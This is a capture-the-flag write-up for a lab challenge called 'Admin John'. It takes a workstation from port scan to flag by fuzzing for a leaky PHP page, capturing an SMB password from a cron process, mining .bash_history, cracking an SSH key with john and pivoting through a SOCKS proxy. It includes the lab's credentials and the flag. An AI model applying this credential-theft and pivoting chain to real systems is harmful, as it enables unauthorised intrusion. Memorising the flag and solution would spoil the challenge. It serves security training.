# Admin John

## Challenge

Hi, TCC-CSIRT analyst,

Please check if any inappropriate services are running on the workstation `john.admins.cypherfix.tcc`. We know that this workstation belongs to an administrator who likes to experiment on his own machine.

See you in the next incident!

## Solution

### 1. Enumeration

We began by scanning for open ports on the workstation using `nmap`:

```bash
nmap -p1-65535 john.admins.cypherfix.tcc
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
23000/tcp open  inovaport1
```

The website at http://john.admins.cypherfix.tcc/ responded with:

```html
<h2>Hello world in PHP.</h2>
```

### 1. Files Fuzzing

Since there was a PHP hint, we ran `feroxbuster` to discover hidden files and directories:

```bash
feroxbuster -u http://john.admins.cypherfix.tcc/ -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt
```

This found an interesting file: http://john.admins.cypherfix.tcc/environment.php

### 2. Inspecting environment.php

We fetched environment.php:

```bash
curl http://john.admins.cypherfix.tcc/environment.php

<h2>Environment Variables</h2>Linux 3c829efad07d 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 (2024-06-21) x86_64 GNU/Linux<br />
<h2>Disk usage</h2>Filesystem      Size  Used Avail Use% Mounted on<br />
overlay          98G   34G   61G  36% /<br />
tmpfs            64M     0   64M   0% /dev<br />
shm              64M     0   64M   0% /dev/shm<br />
/dev/sda2        98G   34G   61G  36% /etc/hosts<br />
tmpfs           3.9G     0  3.9G   0% /proc/acpi<br />
tmpfs           3.9G     0  3.9G   0% /sys/firmware<br />
<h2>Running Processes</h2>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br />
root           1  0.0  0.0   3924  2724 ?        Ss   Oct14   0:00 /bin/bash /entrypoint.sh<br />
root          62  0.0  0.2  37096 21580 ?        S    Oct14   3:07 /usr/bin/python3 /usr/bin/supervisord<br />
root          63  0.0  0.0   2576   792 ?        S    Oct14   0:00  \_ /bin/sh /usr/sbin/apachectl -D FOREGROUND<br />
root          69  0.0  0.1 201060 11880 ?        S    Oct14   0:21  |   \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  323132  0.0  0.1 201656 11844 ?        S    15:12   0:00  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  323143  0.0  0.1 201656 11776 ?        S    15:12   0:00  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  323166  0.0  0.1 201656 11724 ?        S    15:12   0:00  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  323169  0.0  0.1 201656 11844 ?        S    15:12   0:00  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  323175  0.0  0.1 201656 14496 ?        S    15:12   0:00  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  323176  0.0  0.1 201656 14368 ?        S    15:12   0:00  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  323190  0.0  0.1 201656 14364 ?        S    15:12   0:00  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  323191  0.0  0.1 201656 14496 ?        S    15:12   0:00  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  323207  0.0  0.1 201656 14508 ?        S    15:12   0:00  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
www-data  323214  0.0  0.1 201656 14900 ?        S    15:12   0:00  |       \_ /usr/sbin/apache2 -D FOREGROUND<br />
root          64  0.0  0.0   3976  2148 ?        S    Oct14   0:02  \_ cron -f<br />
root      323375  0.0  0.0   5868  2608 ?        S    15:15   0:00  |   \_ CRON -f<br />
root      323376  0.0  0.0   2576   912 ?        Ss   15:15   0:00  |       \_ /bin/sh -c /bin/ps faxu > /backup/ps.txt                                                           <br />
root      323377  0.0  0.0   8100  4016 ?        R    15:15   0:00  |           \_ /bin/ps faxu<br />
root          65  0.0  0.0  15432  4752 ?        S    Oct14   0:19  \_ sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups<br />
john@tc+      66  0.0  0.0   2464   824 ?        S    Oct14   0:00  \_ sshpass -p xxxxxxxxxxxxxxxxxxxx ssh -o StrictHostKeyChecking=no -N -D 0.0.0.0:23000 backuper@10.99.24.100<br />
john@tc+      67  0.1  0.3  34220 25928 pts/0    Ss+  Oct14   6:57      \_ ssh -o StrictHostKeyChecking=no -N -D 0.0.0.0:23000 backuper@10.99.24.100<br />
```

It revealed disk usage and running processes. Among these, we discovered an sshpass process that runs an SSH connection with a hidden password and establishes a SOCKS proxy on port 23000.

### 3. Cron Job and SMB Password

We monitored the cron jobs, and at the right moment, we captured a cron job running with the plaintext password for an smbclient connection:

```
root      323737  0.0  0.0   5868  2600 ?        S    15:20   0:00  |   \_ CRON -f<br />
root      323740  0.0  0.0   2576   912 ?        Ss   15:20   0:00  |       \_ /bin/sh -c read -t 2.0; /bin/bash /opt/client/backup.sh<br />
root      323742  0.0  0.0   3924  2884 ?        S    15:20   0:00  |           \_ /bin/bash /opt/client/backup.sh<br />
root      323747  0.0  0.0  27116  3492 ?        R    15:20   0:00  |               \_ smbclient -U backuper%Bprn5ibLF4KNS4GR5dt4 //10.99.24.100/backup -c put /backup/backup-1729264801.tgz backup-home.tgz<br />
```

### 4. Accessing SMB Share

We used the discovered credentials to connect to the SMB server:

```bash
smbclient -U backuper%Bprn5ibLF4KNS4GR5dt4 //10.99.24.100/backup
ls
  .                                   D        0  Thu Oct 17 15:49:12 2024
  ..                                  D        0  Mon Oct 14 19:10:34 2024
  backup-home.tgz                     A  5830741  Fri Oct 18 17:20:02 2024

                102175644 blocks of size 1024. 63244288 blocks available
                
smb: \> get backup-home.tgz
```

So we have downloaded the `backup-home.tgz`.

### 5. Exploring the Backup

Inside the backup, we found:

- An encrypted SSH private key.
- An authorized_keys file that restricts SSH access to connections from 10.99.24.100 and runs the command `cat /home/john@tcc.local/flag.txt`.
- We also found interesting entries in the `.bash_history` file. These entries revealed prior SSH commands used by the administrator, including the root password and SSH commands to another server (`esx1.tcc.local`):

```bash
ssh -i ~/.ssh/id_rsa root@esx1.tcc.local
Enterprise1512
ssh-keygen -p -f ~/.ssh/id_rsa
```

This provided the necessary clue: the passphrase for the SSH private key was derived from the password `Enterprise1512`.

### 6. Cracking the SSH Key

Using `ssh2john`, `john` and known password `Enterprise`, we cracked the passphrase for the SSH private key:

```bash
ssh2john id_rsa > id_rsa.hash
echo "Enterprise" > w.txt 
john -w w.txt id_rsa.hash --rules=all
```

The passphrase turned out to be `Enterprise2215`. We then decrypted the SSH key:

```bash
chmod 0600 id_rsa
ssh-keygen -p -f id_rsa -m PEM
```

### 7. Accessing the Flag

Finally, we connected through the SOCKS proxy set up on port 23000:

```bash
ssh -o "ProxyCommand=ncat --proxy 10.99.24.101:23000 --proxy-type socks5 %h %p" -i id_rsa john@tcc.local@10.99.24.101
FLAG{sIej-5d9a-aIbh-v4qH}
Connection to 10.99.24.101 closed.
```

## Flag

```
FLAG{sIej-5d9a-aIbh-v4qH}
```
